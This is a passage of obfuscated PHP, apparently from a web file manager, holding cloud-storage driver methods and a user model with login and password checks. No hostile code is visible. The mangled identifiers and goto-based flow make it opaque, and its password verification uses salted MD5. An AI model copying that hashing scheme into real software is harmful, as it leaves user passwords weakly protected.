$dÇ™²ŸÒ[8]; $dÑì°öä½« = $this->objectMeta($dõÒœÀÎå); goto Cœ©îØªì; D‘…ÚÒÁ••: $dÇ™²ŸÒ =& $_SERVER[¼]; if ($Eò¼¥àÃ¼Ö) { return array($dÇ™²ŸÒ[28] => $this->pathThis($dõÒœÀÎå), $dÇ™²ŸÒ[75] => $this->getPathOuter($dÇ™²ŸÒ[8] . $dõÒœÀÎå), $dÇ™²ŸÒ[29] => $dÇ™²ŸÒ[76], $dÇ™²ŸÒ[185] => !0, $dÇ™²ŸÒ[186] => !0); } $DÓ±†¶è–ó = array($dÇ™²ŸÒ[28] => $this->pathThis($dõÒœÀÎå), $dÇ™²ŸÒ[75] => $this->getPathOuter($dÇ™²ŸÒ[8] . $dõÒœÀÎå), $dÇ™²ŸÒ[29] => $dÇ™²ŸÒ[76], $dÇ™²ŸÒ[184] => 0, $dÇ™²ŸÒ[107] => 0, $dÇ™²ŸÒ[185] => !0, $dÇ™²ŸÒ[186] => !0); goto f£–Åœ©º; cÄÙÍŸ¾±Ø: } public function listObjs($e„±¯–äè•, $f¦‹—õà = null, $Aî†‹‰Ã = null, $bÈÕ§ªå‰ = null) { $fñ®”Ç­‚ =& $_SERVER[¼]; $e„±¯–äè• = trim($e„±¯–äè•, $fñ®”Ç­‚[8]); $F êá†¸äŠ = empty($e„±¯–äè•) ? $fñ®”Ç­‚[33] : $e„±¯–äè• . $fñ®”Ç­‚[8]; return $this->client->getBucket($this->bucket, $F êá†¸äŠ, $f¦‹—õà, $Aî†‹‰Ã, $bÈÕ§ªå‰, !0); } public function has($BØŒí‡Æø, $B‡§Ç»¯ñ = false, $c×ÚÁˆß©„ = true) { goto D¸µÊ‡ø±æ; D¸µÊ‡ø±æ: $D¯¦‹íØ¨ =& $_SERVER[¼]; $FªÎàâ‹Éˆ = 0; $BÄ·êËòã = 0; goto Eé’ºœàÜÒ; f¥È‡„¼÷: if ($B‡§Ç»¯ñ) { return array($D¯¦‹íØ¨[188] => $FªÎàâ‹Éˆ, $D¯¦‹íØ¨[189] => $BÄ·êËòã); } return !1; goto A‡‹¨õÊ¼˜; Eé’ºœàÜÒ: $A„»½”µ‰™ = $this->listObjs($BØŒí‡Æø, null, null, $D¯¦‹íØ¨[8]); $A„»½”µ‰™ = is_array($A„»½”µ‰™) ? $A„»½”µ‰™ : array(); foreach ($A„»½”µ‰™ as $C’Œ£ñìĞˆ) { if (isset($C’Œ£ñìĞˆ[$D¯¦‹íØ¨[28]]) && substr($C’Œ£ñìĞˆ[$D¯¦‹íØ¨[28]], -1) != $D¯¦‹íØ¨[8]) { if (!$B‡§Ç»¯ñ && $c×ÚÁˆß©„) { return !0; } $FªÎàâ‹Éˆ++; } else { if (isset($C’Œ£ñìĞˆ[$D¯¦‹íØ¨[183]])) { if (!$B‡§Ç»¯ñ && !$c×ÚÁˆß©„) { return !1; } $BÄ·êËòã++; } } } goto f¥È‡„¼÷; A‡‹¨õÊ¼˜: } public function listAll($c¹ôÍÁ‚ÊÄ) { $C²×í» =& $_SERVER[¼]; $FØ£ç©“Šï = $this->listObjs($c¹ôÍÁ‚ÊÄ); $A‰Šßé¼¾ = $c«ÌÛ…­º = array(); foreach ($FØ£ç©“Šï as $Aµº«×»Ç => $e‰¿×›œæÏ) { $A‰Šßé¼¾[] = $e‰¿×›œæÏ[$C²×í»[28]]; $c«ÌÛ…­º[$Aµº«×»Ç] = $e‰¿×›œæÏ[$C²×í»[77]]; } return $this->listAllFiles($c¹ôÍÁ‚ÊÄ, $A‰Šßé¼¾, $c«ÌÛ…­º); } public function canRead($C¡ÃìÕÄòË) { $aÑ‰ôÒ¯Ÿ© =& $_SERVER[¼]; $aÆéÊ¤ÁÜ = $this->client->getAccessControlPolicy($this->bucket, $C¡ÃìÕÄòË); if (!$aÆéÊ¤ÁÜ) { return !1; } return in_array($aÆéÊ¤ÁÜ, array($aÑ‰ôÒ¯Ÿ©[190], $aÑ‰ôÒ¯Ÿ©[191], $aÑ‰ôÒ¯Ÿ©[192])) ? !0 : !1; } public function canWrite($A‹½ ´ÈÎ) { $c™©³ö•‡¿ =& $_SERVER[¼]; $D‘†¼÷ï¿ó = $this->client->getAccessControlPolicy($this->bucket, $A‹½ ´ÈÎ); if (!$D‘†¼÷ï¿ó) { return !1; } return in_array($D‘†¼÷ï¿ó, array($c™©³ö•‡¿[190], $c™©³ö•‡¿[191])) ? !0 : !1; } public function getContent($EÔ•ˆÊ‹) { return $this->client->getObject($this->bucket, $EÔ•ˆÊ‹); } public function setContent($E¦À…Û¨  , $f¢È¨ùæ = '', $F‹ªŒÀªŸ¿ = false) { goto dÛÈ¢¬İˆ¦; dÈµÎƒ¿¬: $AÀÂÎ³Ñ¼× = $this->client->putObject($f¢È¨ùæ, $this->bucket, $E¦À…Û¨  , $Eá‹ğŒËòæ[182], array(), $aœÙ–µâæ”); if (!$AÀÂÎ³Ñ¼×) { return !1; } if ($F‹ªŒÀªŸ¿) { return !0; } goto b§Š’“Ãà®; b§Š’“Ãà®: $AÀÂÎ³Ñ¼× = $this->copyFile($E¦À…Û¨  , $E¦À…Û¨  , array($Eá‹ğŒËòæ[193] => $AÀÂÎ³Ñ¼×[$Eá‹ğŒËòæ[194]])); return $AÀÂÎ³Ñ¼× ? !0 : !1; goto F­±Ê–³ë‘; dÛÈ¢¬İˆ¦: $Eá‹ğŒËòæ =& $_SERVER[¼]; $E¦À…Û¨   = $F‹ªŒÀªŸ¿ ? trim($E¦À…Û¨  , $Eá‹ğŒËòæ[8]) . $Eá‹ğŒËòæ[8] : $E¦À…Û¨  ; $aœÙ–µâæ” = get_file_mime(get_path_ext($E¦À…Û¨  )); goto dÈµÎƒ¿¬; F­±Ê–³ë‘: } public function fileSubstr($aÍ‚ªÊ…‹Ã, $Dºâ¤Ä, $e¨‘ùµ‘Šƒ) { $EÒ…£øßÁ• = $Dºâ¤Ä + $e¨‘ùµ‘Šƒ - 1; return $this->client->getObject($this->bucket, $aÍ‚ªÊ…‹Ã, array($_SERVER[¼][195] => "\142\171\x74\145\163\75{$Dºâ¤Ä}\x2d{$EÒ…£øßÁ•}")); } public function upload($a’³†œŒ…Ö, $f×ø¤„Ù›, $FæÕ„«¦¬Ì = false, $AƒÉê•Åë© = REPEAT_REPLACE) { $F›³É¤ŒÏœ =& $_SERVER[¼]; $e’Ü§Ü»„å = array($F›³É¤ŒÏœ[193] => @md5_file($f×ø¤„Ù›)); $a´‘àˆ¨›¥ = array($F›³É¤ŒÏœ[196] => get_file_mime(get_path_ext($a’³†œŒ…Ö))); if (IO::size($f×ø¤„Ù›) <= 1024 * 1024 * 200) { $f½õÉÍš• = $this->client->putObjectFile($f×ø¤„Ù›, $this->bucket, $a’³†œŒ…Ö, $F›³É¤ŒÏœ[182], $e’Ü§Ü»„å, $a´‘àˆ¨›¥); return !empty($f½õÉÍš•) ? $this->getPathOuter($a’³†œŒ…Ö) : !1; } $FµÚ¡¥©”¸ = $this->client->multiUploadObject($f×ø¤„Ù›, $this->bucket, trim($a’³†œŒ…Ö, $F›³É¤ŒÏœ[8]), $e’Ü§Ü»„å, $a´‘àˆ¨›¥); return $FµÚ¡¥©”¸ ? $this->getPathOuter($a’³†œŒ…Ö) : !1; } public function download($FÍÍ¹Ìµ­, $dŒùë‘ˆ­«) { if (!@is_dir($this->pathFather($dŒùë‘ˆ­«)) && !IO::mkdir($this->pathFather($dŒùë‘ˆ­«))) { return !1; } $Fµ³Ïáº–¿ = $this->client->getObject($this->bucket, $FÍÍ¹Ìµ­, array(), $dŒùë‘ˆ­«); return $Fµ³Ïáº–¿ !== !1 ? $dŒùë‘ˆ­« : !1; } public function link($CØìÈ¡Ï¥», $d—ù´å°åï = array()) { $Eº¨øÔ¿‰— =& $_SERVER[¼]; if ($this->signVer == $Eº¨øÔ¿‰—[197]) { return $this->client->getAuthenticatedURL($this->bucket, $CØìÈ¡Ï¥», 3600 * 12, $d—ù´å°åï); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($CØìÈ¡Ï¥», $Eº¨øÔ¿‰—[8]), 3600 * 12, $this->region, array(), !0, $d—ù´å°åï); } public function fileOut($CØ„Äò‚©õ, $fÆ™Ã……èã = false, $b‚¥¢âƒİƒ = false, $EÒëŠØËÆø = '') { goto B¿„ñ½³à¶; aèßˆÌÇ½Ò: $c‘ŒÔ°¼â = $this->link($CØ„Äò‚©õ, $b¡™ï£÷Á§); $this->fileOutLink($c‘ŒÔ°¼â); goto AÙÍ¯ØÔÅ˜; B¿„ñ½³à¶: $C¹‡Ä¿‡øÄ =& $_SERVER[¼]; if (!$b‚¥¢âƒİƒ) { $b‚¥¢âƒİƒ = $this->pathThis($CØ„Äò‚©õ); } $FÖ„»ñóîë = get_file_mime(get_path_ext($b‚¥¢âƒİƒ)); goto BÄŞÕª‹¨Á; BÄŞÕª‹¨Á: if ($FÖ„»ñóîë == $C¹‡Ä¿‡øÄ[198]) { return parent::fileOut($CØ„Äò‚©õ, $fÆ™Ã……èã, $b‚¥¢âƒİƒ, $EÒëŠØËÆø); } $fÆ™Ã……èã = $fÆ™Ã……èã ? $C¹‡Ä¿‡øÄ[199] : $C¹‡Ä¿‡øÄ[200]; $b¡™ï£÷Á§ = array($C¹‡Ä¿‡øÄ[201] => $fÆ™Ã……èã . $C¹‡Ä¿‡øÄ[202] . rawurlencode($b‚¥¢âƒİƒ), $C¹‡Ä¿‡øÄ[203] => $FÖ„»ñóîë); goto aèßˆÌÇ½Ò; AÙÍ¯ØÔÅ˜: } public function fileOutServer($E²»øÌÄÉ°, $dóÕá¸Ü¤à = false, $béå¨¢˜‹ = false, $BŒ»ÍŞÒ¯² = '') { parent::fileOut($E²»øÌÄÉ°, $dóÕá¸Ü¤à, $béå¨¢˜‹, $BŒ»ÍŞÒ¯²); } public function fileOutImage($BøÁåöëÊ, $fçÂñÈä±¹ = 250) { $a¡¡®‰œ¢× = $this->link($BøÁåöëÊ); $this->fileOutLink($a¡¡®‰œ¢×); } public function fileOutImageServer($aˆÒ‰¾šç‡, $E„¤÷²İ±Í = 250) { parent::fileOutImage($aˆÒ‰¾šç‡, $E„¤÷²İ±Í); } public function hashMd5($F‡“ÙçãŸÓ, $fµ×¥¿èÁ¶ = '') { $b‡†ÚÆ­¹ =& $_SERVER[¼]; $aÛÖ¦İ‚¨µ = $this->objectMeta($F‡“ÙçãŸÓ); if (!$aÛÖ¦İ‚¨µ) { return !1; } $fµ×¥¿èÁ¶ = $fµ×¥¿èÁ¶ ? $fµ×¥¿èÁ¶ : _get($aÛÖ¦İ‚¨µ, $b‡†ÚÆ­¹[204]); $fµ×¥¿èÁ¶ = $fµ×¥¿èÁ¶ ? $fµ×¥¿èÁ¶ : _get($aÛÖ¦İ‚¨µ, $b‡†ÚÆ­¹[194], $b‡†ÚÆ­¹[33]); return $fµ×¥¿èÁ¶; } public function uploadFormData($BÓ™ÍÔâàá, $cë×‚¦´Ö = 3600) { $d¢ò¼„ë =& $_SERVER[¼]; $E·¨Ÿ„½ã = $this->pathFather($BÓ™ÍÔâàá); $DØ¡ôÓÜÊÁ = $this->client->getHttpUploadPostParams($this->bucket, $E·¨Ÿ„½ã, $d¢ò¼„ë[182], $cë×‚¦´Ö); return array_merge((array) $DØ¡ôÓÜÊÁ, array($d¢ò¼„ë[166] => $this->getHost())); } public function multiUploadFormData($BÔŞ…Áå, $AÆ¨ÌçÓ = 3600) { $aãÅå¼õÊ• =& $_SERVER[¼]; $EâôÃÁÄ¯Á = gmdate($aãÅå¼õÊ•[205]); $cæãóŠÅ ™ = array(); $f—‹Ãìö ù = $this->client->getUploadId($this->bucket, $BÔŞ…Áå, $cæãóŠÅ ™); if (!$f—‹Ãìö ù) { return !1; } return array($aãÅå¼õÊ•[206] => $f—‹Ãìö ù, $aãÅå¼õÊ•[166] => $this->getHost() . $aãÅå¼õÊ•[8] . $this->pathEncode($BÔŞ…Áå), $aãÅå¼õÊ•[207] => $EâôÃÁÄ¯Á, $aãÅå¼õÊ•[89] => $BÔŞ…Áå); } public function multiUploadAuthData($dÓ†×é•», $dæ²ºÇÆ = array()) { goto B¾¨´æÈ¨; cÊ•½Âƒ¸: if (strpos($BğÍšÁÒğŸ, $EÜ„Ñ´·´Ã[210]) === 0) { return array($EÜ„Ñ´·´Ã[217] => $EÍ†ÆÌŠ¾ƒ, $EÜ„Ñ´·´Ã[207] => $f†·Š¼Ñ÷è); } return $EÍ†ÆÌŠ¾ƒ; goto c¢Ÿßƒ‡Œ¤; d‹Üò¡»ß: $aÃ«Ä›ÖŒ = implode($EÜ„Ñ´·´Ã[214], $aì‘¤°Õõè); $F ‘‚é†å = base64_encode(hash_hmac($EÜ„Ñ´·´Ã[215], $aÃ«Ä›ÖŒ, $this->secret, !0)); $EÍ†ÆÌŠ¾ƒ = $EÜ„Ñ´·´Ã[216] . $this->accessKey . $EÜ„Ñ´·´Ã[4] . $F ‘‚é†å; goto cÊ•½Âƒ¸; EĞˆë„†ÜÀ: $aì‘¤°Õõè = array($EÜ„Ñ´·´Ã[209], $EÜ„Ñ´·´Ã[33], $EÜ„Ñ´·´Ã[116], $EÜ„Ñ´·´Ã[33], "\x78\x2d\141\155\x7a\55\144\141\x74\x65\72{$f†·Š¼Ñ÷è}", $EÜ„Ñ´·´Ã[8] . $this->bucket . $EÜ„Ñ´·´Ã[8] . $this->pathEncode($FØ“ÉĞ®ÚÊ) . $BğÍšÁÒğŸ); if (strpos($BğÍšÁÒğŸ, $EÜ„Ñ´·´Ã[210]) === 0) { $aì‘¤°Õõè[0] = $EÜ„Ñ´·´Ã[211]; } if (isset($dæ²ºÇÆ[$EÜ„Ñ´·´Ã[212]]) && $dæ²ºÇÆ[$EÜ„Ñ´·´Ã[212]] == $EÜ„Ñ´·´Ã[213]) { $aì‘¤°Õõè[0] = $EÜ„Ñ´·´Ã[213]; } goto d‹Üò¡»ß; B²Š¢Æ†¯‰: $FØ“ÉĞ®ÚÊ = $dæ²ºÇÆ[$EÜ„Ñ´·´Ã[89]]; unset($dæ²ºÇÆ[$EÜ„Ñ´·´Ã[89]]); if (isset($dæ²ºÇÆ[$EÜ„Ñ´·´Ã[208]])) { $dæ²ºÇÆ[$EÜ„Ñ´·´Ã[207]] = $f†·Š¼Ñ÷è; return $this->listUploadParts($FØ“ÉĞ®ÚÊ, $dæ²ºÇÆ); } goto EĞˆë„†ÜÀ; B¾¨´æÈ¨: $EÜ„Ñ´·´Ã =& $_SERVER[¼]; $f†·Š¼Ñ÷è = isset($dæ²ºÇÆ[$EÜ„Ñ´·´Ã[207]]) ? $dæ²ºÇÆ[$EÜ„Ñ´·´Ã[207]] : gmdate($EÜ„Ñ´·´Ã[205]); $BğÍšÁÒğŸ = isset($dæ²ºÇÆ[$EÜ„Ñ´·´Ã[157]]) ? $dæ²ºÇÆ[$EÜ„Ñ´·´Ã[157]] : $EÜ„Ñ´·´Ã[33]; goto B²Š¢Æ†¯‰; c¢Ÿßƒ‡Œ¤: } public function listUploadParts($C¾âŠ¡ĞØ, $D²ÕƒÁÇ¶Æ = array()) { goto AâÓÌØÇºİ; d»¤¢°°°œ: if (!$Cª¯ØÇ‹°) { return !1; } unset($D²ÕƒÁÇ¶Æ[$bÅ‹óÆÌĞ§[208]], $D²ÕƒÁÇ¶Æ[$bÅ‹óÆÌĞ§[212]]); $D²ÕƒÁÇ¶Æ[$bÅ‹óÆÌĞ§[89]] = $C¾âŠ¡ĞØ; goto cŞ­¦ÂÖéµ; cŞ­¦ÂÖéµ: $BõîêâÆÃ‘ = $this->multiUploadAuthData($C¾âŠ¡ĞØ, $D²ÕƒÁÇ¶Æ); if (empty($BõîêâÆÃ‘)) { return !1; } return array($bÅ‹óÆÌĞ§[217] => $BõîêâÆÃ‘, $bÅ‹óÆÌĞ§[207] => $D²ÕƒÁÇ¶Æ[$bÅ‹óÆÌĞ§[207]], $bÅ‹óÆÌĞ§[219] => $Cª¯ØÇ‹°); goto fĞ×¥ğš; AâÓÌØÇºİ: $bÅ‹óÆÌĞ§ =& $_SERVER[¼]; $D‹‘ä„£ˆ‰ = str_replace($bÅ‹óÆÌĞ§[218], $bÅ‹óÆÌĞ§[33], $D²ÕƒÁÇ¶Æ[$bÅ‹óÆÌĞ§[157]]); $Cª¯ØÇ‹° = $this->client->listParts($this->bucket, $C¾âŠ¡ĞØ, $D‹‘ä„£ˆ‰); goto d»¤¢°°°œ; fĞ×¥ğš: } public function getHost() { return parent::getHost() . $_SERVER[¼][8] . $this->bucket; } public function size($cö¨ùÆ‰ØŒ) { $FÉ±õÔå¦ = $this->objectMeta($cö¨ùÆ‰ØŒ); return $FÉ±õÔå¦ ? $FÉ±õÔå¦[$_SERVER[¼][77]] : 0; } public function info($Dâì©¬„Íİ) { if ($this->isFolder($Dâì©¬„Íİ)) { return $this->folderInfo($Dâì©¬„Íİ); } else { if ($this->isFile($Dâì©¬„Íİ)) { return $this->fileInfo($Dâì©¬„Íİ); } } return !1; } public function exist($AßµíîŒ•—) { return $this->isFile($AßµíîŒ•—) || $this->isFolder($AßµíîŒ•—); } public function isFile($Cğ¶Â®éÂå) { return !$this->isFolder($Cğ¶Â®éÂå) && $this->objectMeta($Cğ¶Â®éÂå); } public function isFolder($Bç¸ÆÈ‚ÍÄ) { return $this->cacheMethod($_SERVER[¼][220], $Bç¸ÆÈ‚ÍÄ); } protected function objectMeta($d×î¢È‡”‘) { return $this->cacheMethod($_SERVER[¼][221], $d×î¢È‡”‘); } protected function _objectMeta($FÀã¼œ¤”×) { $Aå…Ğ†³ÄÆ =& $_SERVER[¼]; $FÀã¼œ¤”× = rtrim($FÀã¼œ¤”×, $Aå…Ğ†³ÄÆ[8]); try { $BÇ…ßÎ—ì = $this->client->getObjectInfo($this->bucket, $FÀã¼œ¤”×); if (!isset($BÇ…ßÎ—ì[$Aå…Ğ†³ÄÆ[204]]) && isset($BÇ…ßÎ—ì[$Aå…Ğ†³ÄÆ[222]])) { $BÇ…ßÎ—ì[$Aå…Ğ†³ÄÆ[204]] = $BÇ…ßÎ—ì[$Aå…Ğ†³ÄÆ[222]]; } } catch (OSS\Core\OssException $dë†ô®°“µ) { $BÇ…ßÎ—ì = !1; } if (!$BÇ…ßÎ—ì) { } return $BÇ…ßÎ—ì; } protected function _isFolder($c¸¶ª ‰ã) { goto cô·©ó¢ç±; cô·©ó¢ç±: $Dó¢†©†ŞÛ =& $_SERVER[¼]; $c¸¶ª ‰ã = rtrim($c¸¶ª ‰ã, $Dó¢†©†ŞÛ[8]); if ($c¸¶ª ‰ã == $Dó¢†©†ŞÛ[33] || $c¸¶ª ‰ã == $Dó¢†©†ŞÛ[8]) { return !0; } goto Añ¡¼¥Ê±; e…†É³¿™©: if (substr($BàÁ­·‰°[0][$Dó¢†©†ŞÛ[28]], -1) == $Dó¢†©†ŞÛ[8]) { return !0; } if (get_path_this($BàÁ­·‰°[0][$Dó¢†©†ŞÛ[28]]) == get_path_this($c¸¶ª ‰ã)) { return !1; } return !0; goto A´…¢©¤´Š; Añ¡¼¥Ê±: $BàÁ­·‰° = $this->client->getBucket($this->bucket, $c¸¶ª ‰ã, null, 1); if (empty($BàÁ­·‰°)) { return !1; } $BàÁ­·‰° = array_values($BàÁ­·‰°); goto e…†É³¿™©; A´…¢©¤´Š: } } define($_SERVER[¼][223], 1); goto bºìÆ„ƒÍ; b´ëĞËÕñ: register_shutdown_function($_SERVER[À Ç][36]); set_error_handler($_SERVER[À Ç][49], $a¬ƒªÕ¼); if (function_exists($_SERVER[À Ç][50])) { set_exception_handler($_SERVER[À Ç][51]); } goto a«Š¢·ªô; e‹òœóã¦¸: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\141\x6d\x65" => "\x75\x73\145\162\137\x6d\145\x74\x61", "\x6d\x65\164\141\106\151\x65\x6c\x64" => "\x75\x73\145\162\x49\104"); protected $simpleField = "\165\x73\145\x72\111\104\x2c\156\x69\143\x6b\x4e\141\155\x65\x2c\156\141\155\x65\54\x61\x76\x61\164\x61\162\54\163\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($fáÚ¹ï’÷á) { $BÃñÕ‰ïİ‡ =& $_SERVER[¼]; $cÛÕ¦£ä = $BÃñÕ‰ïİ‡[2442]; return array($BÃñÕ‰ïİ‡[2133] => array($fáÚ¹ï’÷á[0], $cÛÕ¦£ä), $BÃñÕ‰ïİ‡[2135] => array($fáÚ¹ï’÷á[0], $cÛÕ¦£ä), $BÃñÕ‰ïİ‡[2443] => array($fáÚ¹ï’÷á[0], $cÛÕ¦£ä)); } protected function getInfo($eÖ‰ß½çƒë, $B«ÄÀÉñé = false) { $a®²’…Û™® = $this->getInfoSimple($eÖ‰ß½çƒë); if (!is_array($a®²’…Û™®)) { return array(); } if ($B«ÄÀÉñé) { return $this->_getInfoApply($a®²’…Û™®); } return $this->cacheFunctionGet($_SERVER[¼][2175], $eÖ‰ß½çƒë); } protected function getInfoFull($B¹ó­íœò, $fµÃÒ¥’–Ó = false) { $b’ÌÀ¦Æœ = $this->getInfoSimple($B¹ó­íœò); if (!is_array($b’ÌÀ¦Æœ)) { return array(); } if ($fµÃÒ¥’–Ó) { return $this->_getInfoApply($b’ÌÀ¦Æœ, !0); return $this->_getInfoApply($b’ÌÀ¦Æœ, !0); } return $this->cacheFunctionGet($_SERVER[¼][2444], $B¹ó­íœò); } private function _getInfoApply($E÷Ã†ÊÎíµ, $dšáëç§ˆŠ = false) { goto e÷‹¹â¨ÀÜ; e÷‹¹â¨ÀÜ: $DòÊÂ‘¥´ =& $_SERVER[¼]; if (!$E÷Ã†ÊÎíµ) { return $E÷Ã†ÊÎíµ; } $B¬ÀãÄ¹º = md5($DòÊÂ‘¥´[2445] . $E÷Ã†ÊÎíµ[$DòÊÂ‘¥´[797]] . $DòÊÂ‘¥´[2446] . $E÷Ã†ÊÎíµ[$DòÊÂ‘¥´[28]]); goto CöˆË±î„Ş; CöˆË±î„Ş: $E÷Ã†ÊÎíµ = $this->_listDataApplyItem($E÷Ã†ÊÎíµ); $dÃ–„„Öôš = Model($DòÊÂ‘¥´[1103])->metaGet($E÷Ã†ÊÎíµ[$DòÊÂ‘¥´[388]][$DòÊÂ‘¥´[366]]); $E÷Ã†ÊÎíµ[$DòÊÂ‘¥´[2447]] = $B¬ÀãÄ¹º; goto aË¾ùâÙ; aË¾ùâÙ: $E÷Ã†ÊÎíµ[$DòÊÂ‘¥´[388]][$DòÊÂ‘¥´[2283]] = isset($dÃ–„„Öôš[$DòÊÂ‘¥´[2284]]) ? $dÃ–„„Öôš[$DòÊÂ‘¥´[2284]] : null; if ($dšáëç§ˆŠ) { $E÷Ã†ÊÎíµ[$DòÊÂ‘¥´[413]] = $this->metaGet($E÷Ã†ÊÎíµ[$DòÊÂ‘¥´[1404]]); } return $E÷Ã†ÊÎíµ; goto aí¡£¬õ¡ç; aí¡£¬õ¡ç: } protected function getInfoSimple($eîõÒÕ•ÏÆ, $FÃà²”…„ = false) { $eÉ„›ªñ¦» =& $_SERVER[¼]; if (!$eîõÒÕ•ÏÆ) { return array(); } if ($FÃà²”…„) { $e÷¹šö“±ˆ = $this->where(array($eÉ„›ªñ¦»[1404] => intval($eîõÒÕ•ÏÆ)))->find(); if (!is_array($e÷¹šö“±ˆ)) { return array(); } $e÷¹šö“±ˆ[$eÉ„›ªñ¦»[2448]] = Action($eÉ„›ªñ¦»[2449])->parseUrl($e÷¹šö“±ˆ[$eÉ„›ªñ¦»[2448]]); return $e÷¹šö“±ˆ; } return $this->cacheFunctionGet($eÉ„›ªñ¦»[2136], $eîõÒÕ•ÏÆ); } protected function getInfoSimpleOuter($dŞÊ…¯—·) { goto Dˆ™ª‹â½ë; fáßˆß¿î: $fÁ‰Û„©×‹ = array_field_key($FÀ´¶ÕÓá, explode($Bå·›¦Ç¥÷[47], $this->simpleField)); if (!$fÁ‰Û„©×‹) { return array($Bå·›¦Ç¥÷[1404] => $Bå·›¦Ç¥÷[1024], $Bå·›¦Ç¥÷[28] => $Bå·›¦Ç¥÷[154] . LNG($Bå·›¦Ç¥÷[2452]) . $Bå·›¦Ç¥÷[472], $Bå·›¦Ç¥÷[2448] => STATIC_PATH . $Bå·›¦Ç¥÷[2453]); } $fÁ‰Û„©×‹[$Bå·›¦Ç¥÷[2448]] = Action($Bå·›¦Ç¥÷[2449])->parseUrl($fÁ‰Û„©×‹[$Bå·›¦Ç¥÷[2448]]); goto eà×ê¨–ˆ; Dˆ™ª‹â½ë: $Bå·›¦Ç¥÷ =& $_SERVER[¼]; if (!$dŞÊ…¯—· || $dŞÊ…¯—· == 0) { return array($Bå·›¦Ç¥÷[1404] => $Bå·›¦Ç¥÷[464], $Bå·›¦Ç¥÷[28] => $Bå·›¦Ç¥÷[154] . LNG($Bå·›¦Ç¥÷[2450]) . $Bå·›¦Ç¥÷[472], $Bå·›¦Ç¥÷[2448] => STATIC_PATH . $Bå·›¦Ç¥÷[2451]); } $FÀ´¶ÕÓá = $this->cacheFunctionGet($Bå·›¦Ç¥÷[2136], $dŞÊ…¯—·); goto fáßˆß¿î; eà×ê¨–ˆ: return $fÁ‰Û„©×‹; goto Eµ”Èæä; Eµ”Èæä: } protected function groupUser($dÎçÎ¹õí«) { } public static function errorLang($C•Ï©³˜Š) { $fŠªä±ÔÑ =& $_SERVER[¼]; $eÂ‚ù¢øÏµ = array(self::ERROR_USER_NOT_EXISTS => $fŠªä±ÔÑ[2454], self::ERROR_USER_PASSWORD_ERROR => $fŠªä±ÔÑ[2455], self::ERROR_USER_EXIST_NAME => $fŠªä±ÔÑ[2456], self::ERROR_USER_EXIST_PHONE => $fŠªä±ÔÑ[2457], self::ERROR_USER_EXIST_EMAIL => $fŠªä±ÔÑ[2458], self::ERROR_USER_LOGIN_LOCK => $fŠªä±ÔÑ[2459], self::ERROR_IP_NOT_ALLOW => $fŠªä±ÔÑ[2460], self::ERROR_USER_EXIST_NICKNAME => $fŠªä±ÔÑ[2461]); return LNG($eÂ‚ù¢øÏµ[$C•Ï©³˜Š]); } public function getInfoByMeta($e±ø²é¹Ç, $DÏÎç·½¿) { $fø¤ğ‘÷å£ =& $_SERVER[¼]; $FŸÑ³¶áÕõ = Model($fø¤ğ‘÷å£[2462])->where(array($fø¤ğ‘÷å£[89] => $e±ø²é¹Ç, $fø¤ğ‘÷å£[356] => $DÏÎç·½¿))->find(); if ($FŸÑ³¶áÕõ) { return $this->getInfo($FŸÑ³¶áÕõ[$fø¤ğ‘÷å£[1404]]); } return !1; } public function userLoginCheck($AÉØ¹¤Æ™Ä, $d’ØÎæÛ) { goto Cá³Ç¼ä…ç; Cá³Ç¼ä…ç: $B©ïª‘¦÷ =& $_SERVER[¼]; $f©ƒàï¯Ñ = array($B©ïª‘¦÷[28] => $AÉØ¹¤Æ™Ä, $B©ïª‘¦÷[2287] => $AÉØ¹¤Æ™Ä, $B©ïª‘¦÷[290] => $AÉØ¹¤Æ™Ä, $B©ïª‘¦÷[2463] => $AÉØ¹¤Æ™Ä, $B©ïª‘¦÷[909] => $B©ïª‘¦÷[911]); if ($this->nickNameRpt()) { unset($f©ƒàï¯Ñ[$B©ïª‘¦÷[2287]]); } goto Aã¬Û§Ôä; Aã¬Û§Ôä: $e¼œ®îø‚ˆ = $this->where($f©ƒàï¯Ñ)->find(); if (!$e¼œ®îø‚ˆ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($e¼œ®îø‚ˆ[$B©ïª‘¦÷[1404]], $d’ØÎæÛ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto b˜›ÈÖ™Àò; b˜›ÈÖ™Àò: $this->userEdit($e¼œ®îø‚ˆ[$B©ïª‘¦÷[1404]], array($B©ïª‘¦÷[2464] => time())); $this->clearCache($e¼œ®îø‚ˆ[$B©ïª‘¦÷[1404]]); return $this->getInfo($e¼œ®îø‚ˆ[$B©ïª‘¦÷[1404]]); goto fãéìÙ˜ÀÒ; fãéìÙ˜ÀÒ: } public function clearCache($D‡ŠÄò®é) { $Eä‹»Ğ’Š… =& $_SERVER[¼]; $this->cacheFunctionClear($Eä‹»Ğ’Š…[2175], $D‡ŠÄò®é); $this->cacheFunctionClear($Eä‹»Ğ’Š…[2136], $D‡ŠÄò®é); } public function userPasswordCheck($dáƒ­Šª, $E…½ù÷ºÛ) { $a¹¹Ù‰°ö¹ =& $_SERVER[¼]; $FğãàÏÂ‘Æ = $this->where(array($a¹¹Ù‰°ö¹[1404] => intval($dáƒ­Šª)))->find(); $fŸóÆÆŞø¨ = $this->metaGet($dáƒ­Šª); $B°Å™ù§ˆ› = isset($fŸóÆÆŞø¨[$a¹¹Ù‰°ö¹[2465]]) ? $fŸóÆÆŞø¨[$a¹¹Ù‰°ö¹[2465]] : $a¹¹Ù‰°ö¹[33]; if (md5($B°Å™ù§ˆ› . trim($E…½ù÷ºÛ)) !== $FğãàÏÂ‘Æ[$a¹¹Ù‰°ö¹[797]]) { return !1; } return !0; } public function userAdd($EôÁ‰Ø¨­) { goto a§§™í; a§§™í: $bê­ãæã‚Ï =& $_SERVER[¼]; $d„å¶À­¸ë = array($bê­ãæã‚Ï[383] => $EôÁ‰Ø¨­[$bê­ãæã‚Ï[28]], $bê­ãæã‚Ï[2466] => $EôÁ‰Ø¨­[$bê­ãæã‚Ï[2467]], 